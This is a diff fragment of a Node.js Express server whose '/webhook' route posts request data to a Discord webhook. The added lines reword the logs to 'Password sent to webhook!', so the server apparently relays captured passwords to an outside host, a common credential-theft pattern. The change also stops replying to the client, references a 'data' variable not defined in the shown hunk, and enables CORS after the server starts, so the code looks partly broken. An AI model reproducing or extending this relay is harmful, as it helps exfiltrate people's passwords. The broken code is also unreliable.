@@ -11,22 +11,29 @@ app.post('/webhook', (req, res) => {
 
     // Send the data to the Discord webhook URL
     fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(webhookData)
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
     })
-    .then(response => response.json())
-    .then(data => {
-        res.status(200).send('Message sent to Discord');
+    .then(response => {
+        if (response.ok) {
+            console.log("Password sent to webhook!");
+        } else {
+            console.error("Failed to send password to webhook:", response.statusText);
+        }
     })
     .catch(error => {
-        console.error('Error:', error);
-        res.status(500).send('Error sending message to Discord');
+        console.error("Error sending password to webhook:", error);
     });
+
 });
 
 app.listen(3000, () => {
     console.log('Server running on port 3000');
 });
+
+const cors = require('cors');
+app.use(cors());
+
